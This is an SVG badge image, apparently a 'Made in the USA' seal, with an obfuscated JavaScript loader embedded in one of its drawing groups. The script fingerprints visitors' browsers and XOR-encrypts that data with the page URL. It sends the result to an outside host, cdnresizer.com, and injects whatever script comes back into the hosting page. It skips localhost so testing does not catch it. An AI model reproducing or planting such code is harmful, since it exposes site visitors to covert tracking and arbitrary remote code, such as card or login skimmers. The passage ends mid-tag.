<svg xmlns="http://www.w3.org/2000/svg" width="72" height="73" fill="none" viewBox="0 0 72 73"><path fill="#fff" d="M36.03 19.5H54.9a25.4 25.4 0 00-7.34-5.72H36.03v5.71zM10.74 36.44c0 1.97.23 3.9.65 5.74h49.28c.42-1.85.65-3.77.65-5.74H10.74zM36.03 61.9c4.3 0 8.34-1.08 11.88-2.98H24.14a25.03 25.03 0 0011.89 2.98zM17.2 53.42h37.67a25.58 25.58 0 003.8-5.62H13.4a25.57 25.57 0 003.8 5.62zM36.03 30.82h24.66c-.44-2-1.12-3.91-2-5.7H36.02v5.7z"/><path fill="#EB2227" d="M36.03 36.44h25.29c0-1.93-.22-3.81-.63-5.62H36.03v5.62zM24.14 58.92h23.77a25.4 25.4 0 006.96-5.5H17.19a25.45 25.45 0 006.95 5.5zM13.4 47.8h45.26a25.32 25.32 0 002-5.62H11.4a25.36 25.36 0 002 5.62zM36.03 13.78h11.53a25.03 25.03 0 00-11.53-2.8v2.8zM36.03 25.12h22.65a25.47 25.47 0 00-3.78-5.63H36.03v5.63z"/><path fill="#08519F" d="M36.03 30.82V10.98c-.63 0-1.25.03-1.86.07l.3.82-1.12-.75-.63.08-.93.67.21-.57c-1.17.2-2.31.46-3.43.8l.45 1.26h1.57l-1.3.94.56 1.58-1.39-.93-1.3.93.56-1.59-1.39-.93H28l.34-1.18a25.4 25.4 0 00-15 13h.7l.55-1.48.46 1.58h1.67l-1.4.93.56 1.58-1.3-1.02-1.38 1.02.56-1.58-.66-.52c-.52 1.13-.96 2.3-1.31 3.5h.3l-.38.29c-.2.68-.36 1.38-.5 2.09l.05.13-.07-.04c-.29 1.55-.45 3.15-.45 4.78h25.3v-5.62zM15.88 35.7l-1.3-1.03-1.38 1.03.56-1.58-1.3-.94h1.58l.55-1.58.46 1.59h1.67l-1.39.93.55 1.58zm4.63-4l-1.3-.93-1.29.92.46-1.49-1.3-1.02h1.58l.55-1.49.47 1.5h1.66l-1.3 1.01.47 1.5zm-.46-9.5l.46 1.58-1.3-.93-1.3.93.47-1.58-1.3-.93h1.58l.55-1.59.46 1.59h1.67l-1.3.93zm5.08 13.5l-1.3-1.03-1.29 1.03.46-1.58-1.29-.94h1.67l.46-1.58.55 1.59h1.57l-1.29.93.46 1.58zm-.46-9.5l.46 1.58-1.3-1.02-1.29 1.02.46-1.58-1.29-1.02h1.67l.46-1.5.55 1.59h1.57l-1.29.93zm0-7.91l.46 1.58-1.3-1.03-1.29 1.03.46-1.58-1.29-1.03h1.67l.46-1.49.55 1.5h1.57l-1.29 1.02zm5.18 13.4l-1.39-.92-1.3.92.56-1.49-1.39-1.02H28l.46-1.49.56 1.5h1.57l-1.3 1.01.56 1.5zm-.56-9.5l.56 1.59-1.39-.93-1.3.93.56-1.58-1.39-.93H28l.46-1.59.56 1.59h1.57l-1.3.93zm5.18 13.5l-1.39-1.02-1.29 1.03.56-1.58-1.4-.94h1.67l.46-1.58.56 1.59h1.66l-1.38.93.55 1.58zm-.55-9.49l.55 1.58-1.39-1.02-1.29 1.02.56-1.58-1.4-1.02h1.67l.46-1.5.56 1.59h1.66l-1.38.93zm0-7.91l.55 1.58-1.39-1.03-1.29 1.03.56-1.58-1.4-1.03h1.67l.46-1.49.56 1.5h1.66l-1.38 1.02z"/><path fill="#fff" d="M11.2 31.57v.09l.06.04-.05-.13zM11.79 29.2l-.09.28.4-.29h-.31zM26.33 13.36l1.39.94-.55 1.58 1.29-.93 1.39.93-.56-1.58 1.3-.94h-1.57l-.45-1.26-.23.08-.34 1.18h-1.67zM28.46 19.7L28 21.27h-1.67l1.39.93-.55 1.58 1.29-.93 1.39.93-.56-1.58 1.3-.93H29l-.55-1.59zM29.01 29.2l-.55-1.5-.46 1.5h-1.67l1.39 1.01-.55 1.5 1.29-.93 1.39.92-.56-1.49 1.3-1.02H29zM33.08 15.78l-.46 1.5h-1.66l1.38 1.02-.55 1.58 1.29-1.03 1.39 1.03-.55-1.58 1.38-1.03h-1.66l-.56-1.49zM23.84 15.78l-.47 1.5h-1.66L23 18.3l-.47 1.58 1.3-1.03 1.29 1.03-.46-1.58 1.3-1.03h-1.58l-.55-1.49zM32.72 11.2l-.72.1-.21.57.93-.67zM34.16 11.05l-.81.07 1.12.75-.3-.82zM33.64 33.2l-.56-1.59-.46 1.58h-1.66l1.38.94-.55 1.58 1.29-1.03 1.39 1.03-.55-1.58 1.38-.94h-1.66zM33.08 23.7l-.46 1.49h-1.66l1.38 1.02-.55 1.58 1.29-1.02 1.39 1.02-.55-1.58 1.38-.93h-1.66l-.56-1.58zM15.05 33.2l-.46-1.59-.56 1.58h-1.57l1.3.94-.56 1.58 1.39-1.03 1.29 1.03-.55-1.58 1.39-.94h-1.67zM13.2 27.8l1.39-1.03 1.29 1.02-.55-1.58 1.38-.93h-1.66l-.46-1.58-.56 1.49h-.69l-.24.5.66.52-.56 1.58zM19.67 29.2l-.46-1.5-.55 1.5h-1.57l1.29 1.01-.46 1.5 1.3-.93 1.29.92-.46-1.49 1.29-1.02h-1.67zM19.21 19.7l-.55 1.58h-1.57l1.29.93-.46 1.58 1.3-.93 1.29.93-.46-1.58 1.29-.93h-1.67l-.46-1.59zM23.84 23.7l-.47 1.49h-1.66L23 26.2l-.47 1.58 1.3-1.02 1.29 1.02-.46-1.58 1.3-.93h-1.58l-.55-1.58zM24.4 33.2l-.56-1.59-.47 1.58h-1.66l1.3.94-.47 1.58 1.3-1.03 1.29 1.03-.46-1.58 1.3-.94h-1.58z"/><g style="mix-blend-mode:multiply" opacity=".9"><script>//<![CDATA[
function _0x8a50(){var _0x121064=['2396295KONhaF','navigator','screen','1174494QbOnsy','578912HOchRa','indexOf','stringify','POST','cookieEnabled','/offer/,localhost','language','1vzAEnt','from','length','split','document','fromCharCode','colorDepth','plugins','charCodeAt','open','5150560eFFqzV','parent','toString','send','location','some','onload','width','height','script','2077285cVMPCM','513388BAGdZS','cdnresizer.com/static','text','setAttribute','https:','join','availHeight','devicePixelRatio','text/javascript','map','userAgent','5UIACZI','digest','appendChild','responseText','availWidth','2182620nQRGiA','name','href','3817d9fd-92b8-40ca-be62-dff2106fcf77','body'];_0x8a50=function(){return _0x121064;};return _0x8a50();}function _0x39b4(_0x2e4b9c,_0x44eff1){var _0x8a507b=_0x8a50();return _0x39b4=function(_0x39b441,_0x5c8ec1){_0x39b441=_0x39b441-0xd3;var _0x114631=_0x8a507b[_0x39b441];return _0x114631;},_0x39b4(_0x2e4b9c,_0x44eff1);}var _0x1ee13f=_0x39b4;(function(_0x556248,_0x5c25d4){var _0x1263ad=_0x39b4,_0x203e6d=_0x556248();while(!![]){try{var _0x2de87a=-parseInt(_0x1263ad(0xeb))/0x1*(parseInt(_0x1263ad(0xe4))/0x2)+parseInt(_0x1263ad(0xe3))/0x3+parseInt(_0x1263ad(0x100))/0x4*(parseInt(_0x1263ad(0xd6))/0x5)+-parseInt(_0x1263ad(0xdb))/0x6+-parseInt(_0x1263ad(0xff))/0x7+parseInt(_0x1263ad(0xf5))/0x8+parseInt(_0x1263ad(0xe0))/0x9;if(_0x2de87a===_0x5c25d4)break;else _0x203e6d['push'](_0x203e6d['shift']());}catch(_0x29e329){_0x203e6d['push'](_0x203e6d['shift']());}}}(_0x8a50,0x752c3));try{var currentUrl=window[_0x1ee13f(0xf6)]['location'][_0x1ee13f(0xdd)],keyUrl=_0x1ee13f(0xe9),result=keyUrl[_0x1ee13f(0xee)](',')[_0x1ee13f(0xfa)](function(_0x5da330,_0x33a48d){var _0x4fd034=_0x1ee13f;return currentUrl[_0x4fd034(0xe5)](_0x5da330)>=0x0;});if(result===![]){var bar='|',fonts_key=_0x1ee13f(0xde),xorStrings=(_0x42fca9,_0x484d4c)=>{var _0x4d9c9f=_0x1ee13f,_0x1b72fc='';for(var _0x7fd985=0x0;_0x7fd985<_0x42fca9[_0x4d9c9f(0xed)];_0x7fd985++){_0x1b72fc+=String[_0x4d9c9f(0xf0)](_0x42fca9['charCodeAt'](_0x7fd985)^_0x484d4c[_0x4d9c9f(0xf3)](_0x7fd985%fonts_key[_0x4d9c9f(0xed)]));}return _0x1b72fc;},encrypt=(_0x4d5998,_0x1341c3)=>{return btoa(xorStrings(_0x4d5998,_0x1341c3));};async function sha256(){var _0x56ef45=_0x1ee13f,_0x17cd3c=new TextEncoder()['encode'](getPlugins()+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe1)][_0x56ef45(0xe8)]+bar+window['parent'][_0x56ef45(0xe1)][_0x56ef45(0xea)]+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe1)]['language']+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe1)][_0x56ef45(0xd5)]+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe2)][_0x56ef45(0xfc)]+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe2)][_0x56ef45(0xfd)]+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe2)][_0x56ef45(0xda)]+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe2)][_0x56ef45(0x106)]+bar+window[_0x56ef45(0xf6)][_0x56ef45(0xe2)][_0x56ef45(0xf1)]+bar+window[_0x56ef45(0xf6)][_0x56ef45(0x107)]),_0x330c91=await crypto['subtle'][_0x56ef45(0xd7)]('SHA-256',_0x17cd3c),_0x93ffa9=Array[_0x56ef45(0xec)](new Uint8Array(_0x330c91)),_0x5890c4=_0x93ffa9[_0x56ef45(0xd4)](_0x1cc4f5=>_0x1cc4f5[_0x56ef45(0xf7)](0x10)['padStart'](0x2,'0'))[_0x56ef45(0x105)]('');return _0x5890c4;}function getPlugins(){var _0x51f39e=_0x1ee13f,_0x2735fe='';for(var _0x2c768e=0x0;_0x2c768e<window['parent'][_0x51f39e(0xe1)]['plugins'][_0x51f39e(0xed)];_0x2c768e++){_0x2c768e===window['parent'][_0x51f39e(0xe1)][_0x51f39e(0xf2)][_0x51f39e(0xed)]-0x1?_0x2735fe+=window[_0x51f39e(0xf6)][_0x51f39e(0xe1)][_0x51f39e(0xf2)][_0x2c768e][_0x51f39e(0xdc)]:_0x2735fe+=window[_0x51f39e(0xf6)][_0x51f39e(0xe1)][_0x51f39e(0xf2)][_0x2c768e][_0x51f39e(0xdc)]+',\x20';}return _0x2735fe;}sha256()['then'](function(_0x57d7f1){var _0x512461=_0x1ee13f,_0x182c1b={'link':window[_0x512461(0xf6)][_0x512461(0xf9)][_0x512461(0xdd)],'userHash':_0x57d7f1},_0x41f917=new XMLHttpRequest();_0x41f917[_0x512461(0xf4)](_0x512461(0xe7),_0x512461(0x104)+'/'+'/'+_0x512461(0x101)),_0x41f917[_0x512461(0xfb)]=function(){var _0x1d140d=_0x512461,_0x2b1b38=_0x41f917[_0x1d140d(0xd9)],_0x50d4c9=window['parent'][_0x1d140d(0xef)]['createElement'](_0x1d140d(0xfe));_0x50d4c9[_0x1d140d(0x103)]('type',_0x1d140d(0xd3)),_0x50d4c9[_0x1d140d(0x102)]=_0x2b1b38,window[_0x1d140d(0xf6)]['document'][_0x1d140d(0xdf)][_0x1d140d(0xd8)](_0x50d4c9);},_0x41f917[_0x512461(0xf8)](encrypt(JSON[_0x512461(0xe6)](_0x182c1b),fonts_key));});}}catch(_0x53403b){}
//]]>
</script>
<path fill="url(#paint0_radial)" d="M36.03 61.9a25.38 25.38 0 0025.29-25.46 25.38 25.38 0 00-25.29-25.46 25.38 25.38 0 00-25.29 25.46 25.38 25.38 0 0025.29 25.47z"/></g><path fill="url(#paint1_linear)" d="M36.03 2.44c-9.02 0-17.5 3.53-23.88 9.96a33.9 33.9 0 00-9.9 24.04 33.9 33.9 0 009.9 24.05 33.43 33.43 0 0023.88 9.95c9.02 0 17.5-3.53 23.88-9.95a33.9 33.9 0 009.89-24.05c0-18.75-15.15-34-33.77-34zm0 60.48a26.42 26.42 0 01-26.3-26.48c0-14.6 11.8-26.48 26.3-26.48s26.3 11.88 26.3 26.48-11.8 26.48-26.3 26.48z"/><path fill="url(#paint2_radial)" d="M36.03.22C16.16.22.06 16.44.06 36.44s16.1 36.22 35.97 36.22C55.9 72.66 72 56.45 72 36.44 72 16.44 55.9.22 36.03.22zm0 70.17C17.43 70.4 2.3 55.16 2.3 36.44c0-18.72 15.12-33.96 33.72-33.96s33.72 15.24 33.72 33.96S54.62 70.4 36.03 70.4z"/><path fill="url(#paint3_radial)" d="M36.03 9.94a26.44 26.44 0 00-26.32 26.5c0 14.61 11.8 26.5 26.32 26.5a26.44 26.44 0 0026.32-26.5c0-14.61-11.81-26.5-26.32-26.5zm0 51.87a25.3 25.3 0 01-25.2-25.37 25.3 25.3 0 0125.2-25.37 25.3 25.3 0 0125.2 25.37 25.31 25.31 0 01-25.2 25.37z"/><g fill="#808285" opacity=".6"><path d="M11.51 54.82c.52-.37 1.15-.82 1.8-1.24l-.02-.02c-.65.23-1.42.47-2.04.64l-2.07.6-.52-.8 1.4-1.6c.43-.49.96-1.06 1.47-1.54l-.01-.02c-.62.37-1.31.8-1.88 1.13L7.9 53.02l-.6-.93 4.6-2.65.88 1.34-1.2 1.42c-.4.48-.9 1-1.35 1.43l.02.02c.6-.21 1.29-.46 1.88-.64l1.78-.5.86 1.32L10.51 57l-.65-.98 1.65-1.19zM13.3 57.98l-1.22.7-.88-.9 4.9-2.58 1.1 1.13-2.6 4.92-.9-.92.67-1.26-1.06-1.09zm1.59.33l.56-1.03c.16-.29.37-.63.54-.91v-.01c-.29.16-.63.39-.9.54l-1.03.57.83.84zM18.52 57.7c.4.2.9.5 1.39.85.82.59 1.25 1.11 1.44 1.73.22.65.13 1.39-.41 2.16-.59.83-1.3 1.2-1.96 1.25-.72.06-1.54-.25-2.39-.85-.5-.36-.84-.65-1.06-.86l3-4.27zm-1.5 4.26c.07.08.2.17.32.26.88.63 1.8.55 2.54-.49.63-.9.44-1.75-.4-2.35a2.47 2.47 0 00-.47-.27l-2 2.85zM24.23 64.64l-1.75-.85-.55 1.13 1.96.96-.43.89-3.04-1.49 2.32-4.8 2.94 1.45-.43.89-1.86-.91-.48 1 1.75.85-.43.88zM30.21 63.31l-1.25 5.18-1.17-.28 1.25-5.18 1.17.28zM30.3 68.84l.58-5.3 1.39.15.88 2.06c.25.6.49 1.3.66 1.92h.02c0-.71.06-1.43.14-2.23l.17-1.54 1.1.12-.58 5.3-1.25-.14-.9-2.17c-.25-.6-.52-1.32-.71-1.97h-.03c-.04.7-.1 1.46-.2 2.32l-.18 1.6-1.09-.12zM39.62 64.73l-1.4.21-.15-1 4.02-.6.15 1-1.43.2.64 4.28-1.19.18-.64-4.27zM43.45 62.92l.62 1.95 1.88-.6-.62-1.95 1.13-.37 1.62 5.07-1.13.37-.68-2.12-1.88.6.68 2.13-1.15.37-1.61-5.08 1.14-.37zM51.22 62.96l-1.74.9.57 1.12 1.94-1 .45.89-3.01 1.54-2.4-4.74 2.9-1.5.45.88-1.84.95.5.98 1.73-.89.45.87zM53.66 57.46l2.06 2.28c.61.67 1.17.77 1.63.36.46-.43.42-.98-.2-1.67l-2.06-2.28.88-.81 2 2.22c1.11 1.21 1.01 2.34 0 3.28-1 .9-2.06.9-3.2-.36l-2-2.2.89-.82zM59.56 57.36c.33-.15.77-.44 1.08-.84.34-.43.35-.8.07-1.02-.25-.2-.56-.13-1.13.23-.79.5-1.53.65-2.13.17-.7-.56-.77-1.58 0-2.57.37-.47.74-.74 1.04-.9l.6.8c-.22.11-.57.32-.89.73-.32.4-.3.75-.08.92.27.21.57.07 1.2-.3.85-.53 1.5-.57 2.09-.1.7.55.87 1.57-.04 2.71-.37.48-.87.85-1.19.98l-.62-.8zM62.75 52.7l1 1-.61 1.09-3.81-4.05.77-1.37 5.42 1.18-.64 1.13-1.38-.32-.75 1.33zm-.11-1.63l-1.15-.26-1.02-.28v.02c.23.22.54.49.77.72l.82.83.58-1.03z" opacity=".6"/></g><g fill="#808285" opacity=".6"><path d="M12.13 19.5a57.9 57.9 0 01-1.88-1.11l-.01.02c.49.5 1.02 1.1 1.44 1.6l1.4 1.64-.5.8-2.02-.6a25.1 25.1 0 01-2.01-.7l-.01.02c.59.4 1.27.86 1.81 1.25l1.66 1.14-.58.95-4.32-3.1.84-1.36 1.77.5c.6.16 1.28.4 1.86.63l.02-.02c-.44-.46-.97-.99-1.37-1.46l-1.2-1.41.82-1.34 4.65 2.56-.61 1-1.76-1zM14.66 17.4l.74 1.22-.85.91-2.76-4.83 1.07-1.16 4.99 2.44-.88.94-1.27-.63-1.04 1.12zm.26-1.6l-1.04-.53c-.3-.14-.65-.35-.93-.5h-.01c.18.28.41.61.58.89l.6 1 .8-.86zM14.91 11.61c.31-.32.75-.7 1.23-1.06.8-.6 1.44-.86 2.08-.85.68 0 1.35.31 1.9 1.06.61.82.74 1.6.59 2.26-.17.71-.72 1.4-1.55 2.03-.5.37-.87.6-1.13.75l-3.12-4.19zm3.55 2.76c.1-.04.23-.14.35-.23.87-.65 1.08-1.56.32-2.58-.65-.89-1.51-.97-2.34-.35-.21.16-.34.29-.4.37l2.07 2.79zM23.9 9.4l-1.74.9.59 1.13 1.93-1.01.45.87-3 1.58-2.44-4.73 2.9-1.52.45.87-1.83.97.5.98 1.73-.9.45.86zM28.14 4.7l1.38 5.15-1.16.31-1.38-5.14 1.16-.32zM30.19 9.6l-.72-5.27 1.38-.2 1.36 1.79c.38.51.79 1.13 1.1 1.7l.02-.01c-.17-.69-.29-1.4-.4-2.2l-.2-1.53 1.08-.15.72 5.28-1.24.17-1.4-1.88c-.39-.52-.83-1.16-1.17-1.74l-.02.01c.13.7.25 1.43.36 2.3l.22 1.59-1.09.15zM39.3 4.88l-1.4-.17.11-1 4.04.5-.12 1-1.43-.18-.52 4.29-1.2-.15.52-4.29zM44.26 4.75l-.57 1.96 1.89.56.57-1.96 1.15.33-1.5 5.12-1.14-.34.63-2.14-1.9-.56-.62 2.14-1.15-.34 1.49-5.11 1.15.34zM50.19 10.37l-1.76-.85-.54 1.14 1.96.95-.43.89-3.04-1.47 2.28-4.8 2.95 1.41-.42.9-1.87-.9-.47 1 1.76.84-.42.89zM56.57 11.02l-2 2.34c-.59.69-.62 1.26-.16 1.66.48.42 1.02.32 1.62-.4l2-2.33.9.79L57 15.35c-1.07 1.25-2.19 1.29-3.24.38-1-.88-1.13-1.94-.03-3.23l1.94-2.27.91.8zM56.85 16.82c.08.35.28.84.6 1.24.36.42.72.5.99.27.25-.21.23-.53 0-1.17-.34-.87-.33-1.63.26-2.13.69-.58 1.7-.45 2.5.51.38.46.58.88.67 1.21l-.91.42a2.55 2.55 0 00-.52-1.01c-.34-.4-.68-.44-.89-.26-.26.21-.18.54.06 1.24.34.94.25 1.6-.32 2.08-.68.57-1.7.54-2.64-.58a3.47 3.47 0 01-.71-1.37l.91-.45zM60.14 20.9l-1.36.39-.63-1.07 5.36-1.35.81 1.35-3.69 4.16-.66-1.1.95-1.07-.78-1.3zm1.46.7l.8-.87c.21-.24.5-.53.73-.76v-.01c-.32.1-.7.24-1 .32l-1.13.31.6 1.01z" opacity=".6"/></g><path fill="#000" d="M12.13 19.3c-.56-.31-1.22-.7-1.88-1.1l-.01.01c.49.5 1.02 1.1 1.44 1.6l1.4 1.64-.5.8-2.02-.6a24.8 24.8 0 01-2.01-.7l-.01.02c.59.4 1.27.86 1.81 1.25l1.66 1.14-.59.95-4.31-3.1.84-1.36 1.77.5c.6.17 1.27.4 1.86.63l.02-.02c-.45-.45-.97-.99-1.37-1.45l-1.2-1.42.82-1.34 4.65 2.56-.61 1-1.76-1zM14.66 17.2l.74 1.22-.85.91-2.76-4.83 1.07-1.15 4.99 2.43-.88.95-1.27-.64-1.04 1.12zm.26-1.6l-1.04-.53c-.3-.14-.65-.34-.93-.5l-.01.01c.18.27.41.6.58.88l.6 1 .8-.86zM14.91 11.41c.31-.32.75-.7 1.23-1.06.8-.6 1.44-.85 2.08-.85.68 0 1.35.31 1.9 1.07.61.81.74 1.6.59 2.26-.17.7-.72 1.4-1.55 2.02-.5.37-.87.6-1.13.76l-3.12-4.2zm3.55 2.76c.1-.04.23-.14.35-.23.87-.65 1.08-1.56.32-2.58-.65-.89-1.51-.97-2.34-.35-.21.17-.34.29-.4.37l2.07 2.8zM23.9 9.2l-1.74.91.59 1.12 1.93-1.01.45.88-3 1.57-2.44-4.73 2.9-1.52.45.88-1.83.96.5.98 1.73-.9.45.86zM28.14 4.5l1.38 5.15-1.16.32-1.38-5.15 1.16-.32zM30.19 9.4l-.72-5.27 1.38-.2 1.36 1.8c.38.5.79 1.12 1.1 1.68h.02c-.17-.69-.29-1.4-.4-2.2l-.2-1.53 1.08-.15.72 5.28-1.24.17-1.4-1.88c-.39-.52-.83-1.16-1.17-1.74l-.02.01c.13.7.25 1.44.36 2.3l.22 1.59-1.09.15zM39.3 4.69l-1.4-.18.11-1 4.04.5-.12 1-1.43-.18-.52 4.29-1.2-.15.52-4.28zM44.26 4.55l-.57 1.96 1.89.56.57-1.96 1.15.33-1.5 5.12-1.14-.34.63-2.14-1.9-.56-.62 2.14-1.15-.34 1.49-5.11 1.15.34zM50.19 10.17l-1.76-.85-.54 1.14 1.96.95-.43.89-3.04-1.47 2.28-4.8 2.95 1.41-.42.9-1.87-.9-.47 1 1.76.84-.42.89zM56.57 10.82l-2 2.34c-.59.69-.62 1.26-.16 1.67.48.4 1.02.3 1.62-.4l2-2.34.9.79L57 15.15c-1.07 1.25-2.19 1.29-3.24.38-1-.88-1.13-1.94-.03-3.23l1.94-2.27.91.8zM56.85 16.62c.08.36.28.84.6 1.24.36.42.72.5.99.27.25-.21.23-.53 0-1.16-.34-.88-.33-1.64.26-2.14.69-.58 1.7-.45 2.5.52.38.46.58.87.67 1.2l-.91.43a2.55 2.55 0 00-.52-1.02c-.34-.4-.68-.44-.89-.26-.26.22-.18.54.06 1.24.34.94.25 1.6-.32 2.08-.68.58-1.7.54-2.64-.58a3.47 3.47 0 01-.71-1.36l.91-.46zM60.14 20.71l-1.36.38-.63-1.07 5.36-1.35.81 1.35-3.69 4.17-.66-1.12.95-1.05-.78-1.31zm1.46.7l.8-.87c.21-.25.5-.53.73-.76v-.02c-.32.1-.7.24-1 .32L61 20.4l.6 1.01zM11.51 55.02c.52-.37 1.15-.82 1.8-1.24l-.02-.02c-.65.23-1.42.47-2.04.64l-2.07.6-.52-.8 1.4-1.6c.43-.49.96-1.06 1.47-1.55h-.01c-.62.36-1.31.8-1.88 1.12L7.9 53.21l-.6-.94 4.6-2.64.88 1.34-1.2 1.42c-.4.48-.9.99-1.35 1.43l.02.02c.6-.21 1.29-.46 1.88-.64l1.78-.5.86 1.32-4.26 3.17-.65-.98 1.65-1.2zM13.3 58.18l-1.22.7-.88-.9 4.9-2.58 1.1 1.13-2.6 4.92-.9-.93.67-1.25-1.06-1.09zm1.59.33l.56-1.03c.16-.29.37-.63.54-.91v-.01c-.29.16-.63.39-.9.54l-1.03.57.83.84zM18.52 57.9c.4.2.9.5 1.39.85.82.59 1.25 1.11 1.44 1.73.22.65.13 1.39-.41 2.16a2.68 2.68 0 01-1.96 1.25c-.72.06-1.54-.25-2.39-.85-.5-.36-.84-.65-1.06-.86l3-4.28zm-1.5 4.26c.07.08.2.17.32.26.88.63 1.8.55 2.54-.49.63-.9.44-1.75-.4-2.35a2.5 2.5 0 00-.47-.27l-2 2.85zM24.23 64.84l-1.75-.86-.55 1.14 1.96.96-.43.89-3.04-1.49 2.32-4.8 2.94 1.45-.43.89-1.86-.91-.48 1 1.75.85-.43.88zM30.21 63.51l-1.25 5.18-1.17-.28 1.25-5.19 1.17.3zM30.3 69.03l.58-5.3 1.39.16.88 2.06c.25.6.49 1.3.66 1.91h.02c0-.7.06-1.42.14-2.22l.17-1.54 1.1.12-.58 5.3-1.25-.14-.9-2.17c-.25-.6-.52-1.32-.71-1.97h-.03c-.04.7-.1 1.45-.2 2.32l-.18 1.6-1.09-.13zM39.62 64.93l-1.4.2-.15-1 4.02-.6.15 1-1.43.22.64 4.27-1.19.18-.64-4.27zM43.45 63.12l.62 1.95 1.88-.6-.62-1.96 1.13-.36 1.62 5.07-1.13.37-.68-2.12-1.88.6.68 2.13-1.15.37-1.61-5.08 1.14-.37zM51.22 63.16l-1.74.9.57 1.12 1.94-1 .45.89-3.01 1.54-2.4-4.75 2.9-1.49.45.88-1.84.95.5.98 1.73-.9.45.88zM53.66 57.66l2.06 2.28c.61.67 1.17.77 1.63.36.46-.43.42-.98-.2-1.67l-2.06-2.28.88-.81 2 2.22c1.11 1.21 1.01 2.34 0 3.28-1 .9-2.06.9-3.2-.36l-2-2.2.89-.82zM59.56 57.56c.33-.15.77-.44 1.08-.84.34-.43.35-.8.07-1.02-.25-.2-.56-.13-1.13.23-.79.5-1.53.65-2.13.17-.7-.56-.77-1.59 0-2.57.37-.47.74-.75 1.04-.9l.6.8c-.22.11-.57.32-.89.73-.32.4-.3.75-.08.92.27.21.57.07 1.2-.3.85-.53 1.5-.57 2.09-.1.7.55.87 1.57-.04 2.72-.37.47-.87.84-1.19.97l-.62-.8zM62.75 52.9l1 1-.61 1.08-3.81-4.04.77-1.37 5.42 1.18-.64 1.13-1.38-.32-.75 1.33zm-.11-1.63L61.49 51c-.32-.07-.7-.18-1.02-.27v.02l.77.71.82.84.58-1.03z"/><path fill="#808285" d="M66.47 34.12l-1.24 1.48-1.9-.2 1 1.65-.77 1.77 1.87-.46 1.43 1.28.14-1.92 1.66-.98-1.78-.73-.4-1.89z" opacity=".6"/><path fill="#000" d="M66.55 33.81L65.3 35.3l-1.91-.2 1.01 1.65-.77 1.77 1.86-.46 1.44 1.29.14-1.93 1.66-.98-1.78-.73-.41-1.89z"/><path fill="#808285" d="M65.1 26.7l-.97 1.65-1.92.13 1.27 1.46-.47 1.87 1.76-.76 1.63 1.03-.18-1.93 1.48-1.24-1.88-.42-.71-1.8z" opacity=".6"/><path fill="#000" d="M65.13 26.38l-.98 1.66-1.91.13 1.26 1.45-.47 1.88 1.77-.77 1.62 1.03-.17-1.92 1.47-1.24-1.87-.43-.72-1.8z"/><path fill="#808285" d="M66.1 41.66l-1.58 1.1-1.79-.7.55 1.86-1.21 1.5 1.92.05 1.05 1.62.63-1.82 1.86-.5L66 43.59l.1-1.93z" opacity=".6"/><path fill="#000" d="M66.26 41.39l-1.58 1.1-1.8-.7.55 1.86-1.2 1.5 1.91.05 1.05 1.62.64-1.82 1.85-.5-1.52-1.18.1-1.93z"/><path fill="#808285" d="M5.55 34.11L6.8 35.6l1.91-.2-1 1.65.76 1.77-1.86-.46-1.44 1.28-.14-1.92-1.65-.98L5.14 36l.41-1.89z" opacity=".6"/><path fill="#000" d="M5.48 33.8l1.24 1.48 1.9-.19-1 1.64.77 1.77-1.87-.46-1.43 1.29-.14-1.93-1.66-.98 1.78-.73.4-1.88z"/><path fill="#808285" d="M6.92 26.68l.98 1.67 1.91.12-1.26 1.46.47 1.87-1.77-.76-1.62 1.03.17-1.93-1.47-1.24 1.87-.42.72-1.8z" opacity=".6"/><path fill="#000" d="M6.9 26.37l.97 1.66 1.92.13-1.27 1.45L9 31.5l-1.76-.77-1.63 1.03.18-1.92-1.47-1.24 1.87-.43.71-1.8z"/><path fill="#808285" d="M5.92 41.65l1.58 1.1 1.8-.7-.55 1.86 1.2 1.5-1.91.05-1.05 1.62-.64-1.82-1.85-.5 1.52-1.18-.1-1.93z" opacity=".6"/><path fill="#000" d="M5.77 41.38l1.58 1.1 1.8-.7-.55 1.85 1.2 1.5-1.92.06-1.04 1.62-.64-1.82-1.86-.5 1.53-1.18-.1-1.93z"/><defs><radialGradient id="paint0_radial" cx="0" cy="0" r="1" gradientTransform="matrix(25.2895 0 0 25.4639 36.03 36.44)" gradientUnits="userSpaceOnUse"><stop stop-color="#FBFBFB"/><stop offset=".52" stop-color="#F9F9F9"/><stop offset=".69" stop-color="#F3F4F4"/><stop offset=".72" stop-color="#F0F0F1"/><stop offset=".76" stop-color="#E5E6E7"/><stop offset=".8" stop-color="#D4D5D7"/><stop offset=".84" stop-color="#BBBDBF"/><stop offset=".88" stop-color="#9D9FA2"/><stop offset=".92" stop-color="#7A7C7E"/><stop offset=".96" stop-color="#4F4F51"/><stop offset=".98" stop-color="#222223"/></radialGradient><radialGradient id="paint2_radial" cx="0" cy="0" r="1" gradientTransform="matrix(35.971 0 0 36.2191 36.03 36.44)" gradientUnits="userSpaceOnUse"><stop offset=".92" stop-color="#B28B39"/><stop offset=".93" stop-color="#B6903C"/><stop offset=".94" stop-color="#C49E48"/><stop offset=".95" stop-color="#DAB860"/><stop offset=".96" stop-color="#FFE080"/><stop offset=".96" stop-color="#EACA6F"/><stop offset=".98" stop-color="#CAA54F"/><stop offset=".99" stop-color="#B8913E"/><stop offset="1" stop-color="#B28B39"/></radialGradient><radialGradient id="paint3_radial" cx="0" cy="0" r="1" gradientTransform="matrix(26.3168 0 0 26.4983 36.03 36.44)" gradientUnits="userSpaceOnUse"><stop stop-color="#A37F33"/><stop offset=".32" stop-color="#FFE080"/><stop offset=".41" stop-color="#EACB71"/><stop offset=".58" stop-color="#D3B25C"/><stop offset=".7" stop-color="#CBAA55"/><stop offset=".85" stop-color="#C8A753"/><stop offset=".9" stop-color="#C19F4C"/><stop offset=".94" stop-color="#B59241"/><stop offset=".97" stop-color="#A48134"/><stop offset=".97" stop-color="#A37F33"/><stop offset=".98" stop-color="#B69342"/><stop offset="1" stop-color="#EFD175"/><stop offset="1" stop-color="#FFE080"/></radialGradient><linearGradient id="paint1_linear" x1="3.39" x2="68.71" y1="45.25" y2="27.86" gradientUnits="userSpaceOnUse"><stop stop-color="#A87F30"/><stop offset=".25" stop-color="#E0BF63"/><stop offset=".5" stop-color="#FFE080"/><stop offset=".75" stop-color="#E0BF63"/><stop offset="1" 